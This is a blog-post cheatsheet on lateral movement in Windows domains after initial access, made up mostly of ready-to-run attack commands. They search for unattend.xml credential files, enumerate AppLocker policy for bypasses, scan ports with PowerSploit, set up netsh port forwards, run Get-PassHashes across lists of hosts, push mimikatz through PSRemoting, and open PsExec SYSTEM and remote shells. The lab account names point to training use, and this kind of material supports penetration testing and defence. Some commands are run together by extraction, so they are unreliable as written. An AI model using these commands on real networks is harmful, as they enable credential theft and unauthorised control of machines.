<!doctype html><!-- This site was created with Wowchemy. https://www.wowchemy.com --><!-- Last Published: January 29, 2023 --><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.242b882c3b0c00ae28b251add3931eef.css><link rel=stylesheet href=/css/libs/chroma/github-light.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><script async src="https://www.googletagmanager.com/gtag/js?id=G-NNZHY5233M"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}function trackOutboundLink(e,t){gtag("event","click",{event_category:"outbound",event_label:e,transport_type:"beacon",event_callback:function(){t!=="_blank"&&(document.location=e)}}),console.debug("Outbound link clicked: "+e)}function onClickCallback(e){if(e.target.tagName!=="A"||e.target.host===window.location.host)return;trackOutboundLink(e.target,e.target.getAttribute("target"))}gtag("js",new Date),gtag("config","G-NNZHY5233M",{}),gtag("set",{cookie_flags:"SameSite=None;Secure"}),document.addEventListener("click",onClickCallback,!1)</script><meta name=author content="Giovanni Pecoraro"><meta name=description content="Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets."><link rel=alternate hreflang=en-us href=https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/><link rel=canonical href=https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#3f51b5"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="@Peco602"><meta property="twitter:creator" content="@Peco602"><meta property="twitter:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:site_name" content="Giovanni Pecoraro"><meta property="og:url" content="https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/"><meta property="og:title" content="Domain Lateral Movement cheatsheet | Giovanni Pecoraro"><meta property="og:description" content="Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets."><meta property="og:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2022-07-24T00:00:00+00:00"><meta property="article:modified_time" content="2022-07-24T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/"},"headline":"Domain Lateral Movement cheatsheet","datePublished":"2022-07-24T00:00:00Z","dateModified":"2022-07-24T00:00:00Z","author":{"@type":"Person","name":"Giovanni Pecoraro"},"publisher":{"@type":"Organization","name":"Giovanni Pecoraro","logo":{"@type":"ImageObject","url":"https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"}},"description":"Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets."}</script><title>Domain Lateral Movement cheatsheet | Giovanni Pecoraro</title></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=44a4343245f8e67ac4def8907bbdaff7><script src=/js/wowchemy-init.min.7532de8e15162845d694f17af8b46a99.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><div class="navbar-collapse main-menu-item collapse justify-content-start" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/#about><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/#posts><span>Posts</span></a></li><li class=nav-item><a class=nav-link href=/#projects><span>Projects</span></a></li><li class=nav-item><a class=nav-link href=/#talks><span>Talks</span></a></li><li class=nav-item><a class=nav-link href=/#featured><span>Publications</span></a></li><li class=nav-item><a class=nav-link href=/#contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class="nav-item d-none d-lg-inline-flex"><a class=nav-link href=https://twitter.com/Peco602 data-toggle=tooltip data-placement=bottom title="Follow me on Twitter" target=_blank rel=noopener aria-label="Follow me on Twitter"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Domain Lateral Movement cheatsheet</h1><p class=page-subtitle>Lateral movement refers to the techniques that an attacker can use, after gaining initial access, to move deeper into a network in search of sensitive data and other high-value assets.</p><div class=article-metadata><div><span class=author-highlighted>Giovanni Pecoraro</span></div><span class=article-date>Jul 24, 2022</span>
<span class=middot-divider></span>
<span class=article-reading-time>7 min read</span>
<span class=middot-divider></span>
<span class=article-categories><i class="fas fa-folder mr-1"></i><a href=/category/cyber-security/>Cyber Security</a></span></div></div><div class=article-container><div class=article-style><h2 id=local-files>Local Files</h2><p>Find local senstive files on computers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView</span>
</span></span><span class=line><span class=cl><span class=nb>Get-ChildItem</span> <span class=n>-Filter</span> <span class=p>*.</span><span class=n>xml</span> <span class=n>-Path</span> <span class=n>c:</span><span class=p>\</span> <span class=n>-RecurseGet-ChildItem</span> <span class=n>-Filter</span> <span class=p>*</span><span class=n>unattend</span><span class=p>*.</span><span class=n>xml</span> <span class=n>-Path</span> <span class=n>c:</span><span class=p>\</span> <span class=n>-Recurse</span>
</span></span></code></pre></div><h2 id=applocker>AppLocker</h2><p>Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at <a href=https://lolbas-project.github.io/ target=_blank rel=noopener>LOLBAS</a> if only signed binaries are allowed:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-AppLockerPolicy</span> <span class=n>-Effective</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>RuleCollections</span>
</span></span></code></pre></div><h2 id=port-scanning>Port Scanning</h2><p>Check machine reachability:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Test-NetConnection</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-Port</span> <span class=mf>3389</span>
</span></span></code></pre></div><p>Perform a port scanning:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerSploit</span>
</span></span><span class=line><span class=cl><span class=c>## Open and filtered ports</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Portscan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;COMPUTER1&#34;</span><span class=p>,</span><span class=s2>&#34;COMPUTER2&#34;</span><span class=p>)</span> <span class=n>-TopPorts</span> <span class=mf>200</span> <span class=p>|</span> <span class=p>%{</span><span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>Hostname</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- OPEN ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- FILTERED ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>filteredPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;------------&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Portscan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;COMPUTER1&#34;</span><span class=p>,</span><span class=s2>&#34;COMPUTER2&#34;</span><span class=p>)</span> <span class=n>-Ports</span> <span class=s2>&#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&#34;</span> <span class=p>|</span> <span class=p>%{</span><span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>Hostname</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- OPEN ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- FILTERED ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>filteredPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;------------&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## Only open ports</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Portscan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;COMPUTER1&#34;</span><span class=p>,</span><span class=s2>&#34;COMPUTER2&#34;</span><span class=p>)</span> <span class=n>-TopPorts</span> <span class=mf>200</span> <span class=p>|</span> <span class=p>%{</span><span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>Hostname</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- OPEN ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;------------&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;&#34;</span><span class=p>}</span><span class=nb>Invoke-Portscan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=nb>Get-NetComputer</span><span class=p>)</span> <span class=n>-TopPorts</span> <span class=mf>200</span> <span class=p>|</span> <span class=p>%{</span><span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>Hostname</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- OPEN ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;------------&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Portscan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;COMPUTER1&#34;</span><span class=p>,</span><span class=s2>&#34;COMPUTER2&#34;</span><span class=p>)</span> <span class=n>-Ports</span> <span class=s2>&#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&#34;</span> <span class=p>|</span> <span class=p>%{</span><span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>Hostname</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- OPEN ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;------------&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Portscan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=nb>Get-NetComputer</span><span class=p>)</span> <span class=n>-Ports</span> <span class=s2>&#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901,5985&#34;</span> <span class=p>|</span> <span class=p>%{</span><span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>Hostname</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;--- OPEN ---&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;------------&#34;</span><span class=p>;</span> <span class=nb>echo </span><span class=s2>&#34;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## In place of host array it is possible to use a subnet (e.g. 192.168.1.0/24)</span>
</span></span></code></pre></div><h2 id=port-forwarding>Port forwarding</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Forward a port to another host/port</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=n>sh</span> <span class=n>interface</span> <span class=n>portproxy</span> <span class=n>add</span> <span class=n>v4tov4</span> <span class=n>listenport</span><span class=p>=</span><span class=mf>80</span> <span class=n>listenaddress</span><span class=p>=</span><span class=mf>192.168</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>9</span> <span class=n>connectport</span><span class=p>=</span><span class=mf>5985</span> <span class=n>connectaddress</span><span class=p>=</span><span class=mf>192.168</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## Note. Use IP addresses and not FQDNs not to trigger Kerberos auth</span>
</span></span><span class=line><span class=cl><span class=nb>Set-Item</span> <span class=n>wsman</span><span class=err>:</span><span class=p>\</span><span class=n>localhost</span><span class=p>\</span><span class=n>Client</span><span class=p>\</span><span class=n>TrustedHosts</span> <span class=n>-value</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=nv>$securePassword</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=s2>&#34;Password&#34;</span> <span class=n>-AsPlainText</span> <span class=n>-force</span>
</span></span><span class=line><span class=cl><span class=nv>$credential</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=py>PsCredential</span><span class=p>(</span><span class=s2>&#34;cyberlab\STUDENT1&#34;</span><span class=p>,</span><span class=nv>$securePassword</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>Enter-PSSession</span> <span class=n>-ComputerName</span> <span class=mf>192.168</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>9</span> <span class=n>-Port</span> <span class=mf>80</span> <span class=n>-Credential</span> <span class=nv>$securePassword</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Show all forwardings</span>
</span></span><span class=line><span class=cl><span class=n>netsh</span> <span class=n>interface</span> <span class=n>portproxy</span> <span class=n>show</span> <span class=n>all</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Delete all forwardings</span>
</span></span><span class=line><span class=cl><span class=n>netsh</span> <span class=n>interface</span> <span class=n>portproxy</span> <span class=n>reset</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Delete a specific forwardingnet</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=n>interface</span> <span class=n>portproxy</span> <span class=n>delete</span> <span class=n>v4tov4</span> <span class=n>listenport</span><span class=p>=</span><span class=mf>80</span> <span class=n>listenaddress</span><span class=p>=</span><span class=mf>192.168</span><span class=p>.</span><span class=py>1</span><span class=p>.</span><span class=py>9</span>
</span></span></code></pre></div><h2 id=psremoting>PSRemoting</h2><p><em>Requires ‘HTTP’ and ‘WSMAN’ SPNs</em></p><p>Enable PSRemoting on local machine and adds exception to the firewall:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Enable-PSRemoting</span>
</span></span></code></pre></div><p>Create a PSSession:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$sess</span> <span class=p>=</span> <span class=nb>New-PSSession</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;cyberlab\STUDENT1&#34;</span>
</span></span></code></pre></div><p>Enter a PSSession:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Enter-PSSession</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span><span class=n>-Credential</span> <span class=s2>&#34;cyberlab\STUDENT1&#34;</span> <span class=n>-Session</span> <span class=nv>$sess</span>
</span></span></code></pre></div><p>Use below to execute commands or scriptblocks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-ComputerName</span> <span class=p>(</span><span class=nb>Get-Content</span> <span class=s2>&#34;.\list_of_computers.txt&#34;</span><span class=p>)</span> <span class=n>-ScriptBlock</span> <span class=p>{</span><span class=nb>Get-Process</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-ScriptBlock</span> <span class=p>{</span><span class=n>whoami</span><span class=p>;</span><span class=n>hostname</span><span class=p>}</span>
</span></span></code></pre></div><p>Use below to execute commands with alternative credentials without prompt (useful to solve the double-hop problem):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$securePassword</span> <span class=p>=</span> <span class=nb>ConvertTo-SecureString</span> <span class=s2>&#34;Password&#34;</span> <span class=n>-AsPlainText</span> <span class=n>-Force</span>
</span></span><span class=line><span class=cl><span class=nv>$credential</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=py>PsCredential</span><span class=p>(</span><span class=s2>&#34;cyberlab\STUDENT1&#34;</span><span class=p>,</span><span class=nv>$securePassword</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-ScriptBlock</span> <span class=p>{</span><span class=n>whoami</span><span class=p>;</span><span class=n>hostname</span><span class=p>}</span> <span class=n>-Credential</span> <span class=nv>$credential</span>
</span></span></code></pre></div><p>or to start a new session:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$Sess</span> <span class=p>=</span> <span class=nb>New-PSSession</span> <span class=n>-Computername</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-Credential</span> <span class=nv>$credentialInvoke</span><span class=n>-Command</span> <span class=n>-Session</span> <span class=nv>$sess</span> <span class=n>-ScriptBlock</span> <span class=p>{</span><span class=n>whoami</span><span class=p>}</span>
</span></span></code></pre></div><p>Use below to execute scripts from files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-FilePath</span> <span class=s2>&#34;C:\scripts\Get-PassHashes.ps1&#34;</span> <span class=n>-ComputerName</span> <span class=p>(</span><span class=nb>Get-Content</span> <span class=s2>&#34;.\list_of_computers.txt&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Use below to execute locally loaded function on the remote machines:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-ScriptBlock</span> <span class=p>${</span><span class=n>function</span><span class=err>:</span><span class=nb>Get-PassHashes</span><span class=p>}</span> <span class=n>-ComputerName</span> <span class=p>(</span><span class=nb>Get-Content</span> <span class=s2>&#34;.\list_of_computers.txt&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-Command</span> <span class=n>-ScriptBlock</span> <span class=p>${</span><span class=n>function</span><span class=err>:</span><span class=nb>Get-PassHashes</span><span class=p>}</span> <span class=n>-ComputerName</span> <span class=p>(</span><span class=nb>Get-Content</span> <span class=s2>&#34;.\list_of_computers.txt&#34;</span><span class=p>)</span> <span class=n>-ArgumentList</span>
</span></span></code></pre></div><p>Execute “Stateful” commands using Invoke-Command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$Sess</span> <span class=p>=</span> <span class=nb>New-PSSession</span> <span class=n>-Computername</span> <span class=s2>&#34;COMPUTER1&#34;</span><span class=nb>Invoke-Command</span> <span class=n>-Session</span> <span class=nv>$Sess</span> <span class=n>-ScriptBlock</span> <span class=p>{</span><span class=nv>$Proc</span> <span class=p>=</span> <span class=n>GetProcess</span><span class=p>}</span><span class=nb>Invoke-Command</span> <span class=n>-Session</span> <span class=nv>$Sess</span> <span class=n>-ScriptBlock</span> <span class=p>{</span><span class=nv>$Proc</span><span class=p>.</span><span class=n>Name</span><span class=p>}</span>
</span></span></code></pre></div><p>Copy files between PSRemoting sessions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$Sess</span> <span class=p>=</span> <span class=nb>New-PSSession</span> <span class=n>-Computername</span> <span class=s2>&#34;COMPUTER1&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Copy-Item</span> <span class=n>-Path</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Public</span><span class=p>\</span><span class=nb>Inveigh-NTLMv2</span><span class=p>.</span><span class=py>txt</span> <span class=n>-Destination</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>user01</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span> <span class=n>-FromSession</span> <span class=nv>$sess</span>
</span></span><span class=line><span class=cl><span class=nb>Copy-Item</span> <span class=n>-Path</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>user01</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>mimikatz</span><span class=p>.</span><span class=py>exe</span> <span class=n>-Destination</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Public</span><span class=p>\</span> <span class=n>-ToSession</span> <span class=nv>$sess</span>
</span></span></code></pre></div><h2 id=psexec>PsExec</h2><p>Launch a shell on the local machine as DIFFERENT user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=n>-u</span> <span class=s2>&#34;CYBERLAB\student1&#34;</span> <span class=n>-p</span> <span class=s2>&#34;Password123.&#34;</span> <span class=n>-i</span> <span class=n>-d</span> <span class=n>cmd</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=n>-u</span> <span class=s2>&#34;CYBERLAB\student1&#34;</span> <span class=n>-p</span> <span class=s2>&#34;Password123.&#34;</span> <span class=n>-i</span> <span class=n>-d</span> <span class=n>powershell</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p>Launch a SYSTEM shell on the local machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=n>-s</span> <span class=n>-i</span> <span class=n>-d</span> <span class=n>cmd</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=n>-s</span> <span class=n>-i</span> <span class=n>-d</span> <span class=n>powershell</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></div><p>If you get the admin/password of a RID 500 user of a machine, it is possible to get a SYSTEM session on that machine by <code>psexec</code>. It is also possible to use a <code>cmd</code> or <code>powershell</code> session launched from <code>mimikatz</code> after Pass-The-Hash.</p><p>Execute command in remote computer:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=p>\\</span><span class=n>COMPUTER1</span> <span class=n>-u</span> <span class=p>[</span><span class=no>USER</span><span class=p>]</span> <span class=n>-p</span> <span class=p>[</span><span class=no>PASSWORD] [COMMAND</span><span class=p>]</span>
</span></span></code></pre></div><p>Execute command ‘netstat -an’ in remote and output result in local computer:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=p>\\</span><span class=n>COMPUTER1</span> <span class=n>-u</span> <span class=p>[</span><span class=no>USER</span><span class=p>]</span> <span class=n>-p</span> <span class=p>[</span><span class=no>PASSWORD</span><span class=p>]</span> <span class=n>netstat</span> <span class=n>-an</span> <span class=p>&gt;</span> <span class=n>c:</span><span class=p>\</span><span class=n>file</span><span class=p>.</span><span class=py>txt</span>
</span></span></code></pre></div><p>Execute command in remote and output result in remote:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=p>\\</span><span class=n>COMPUTER1</span> <span class=n>-u</span> <span class=p>[</span><span class=no>USER</span><span class=p>]</span> <span class=n>-p</span> <span class=p>[</span><span class=no>PASSWORD</span><span class=p>]</span> <span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=n>netstat</span> <span class=n>-an</span> <span class=p>^&gt;</span><span class=n>c:</span><span class=p>\</span><span class=n>file</span><span class=p>.</span><span class=py>txt</span>
</span></span></code></pre></div><p>Execute program to interact with user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=p>\\</span><span class=n>COMPUTER1</span> <span class=n>-u</span> <span class=p>[</span><span class=no>USER</span><span class=p>]</span> <span class=n>-p</span> <span class=p>[</span><span class=no>PASSWORD</span><span class=p>]</span> <span class=n>-d</span> <span class=n>-i</span> <span class=n>notepad</span>
</span></span></code></pre></div><p>Run remote shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>psexec</span><span class=p>.</span><span class=py>exe</span> <span class=p>\\</span><span class=n>COMPUTER1</span> <span class=n>-u</span> <span class=p>[</span><span class=no>USER</span><span class=p>]</span> <span class=n>-p</span> <span class=p>[</span><span class=no>PASSWORD</span><span class=p>]</span> <span class=n>cmd</span>
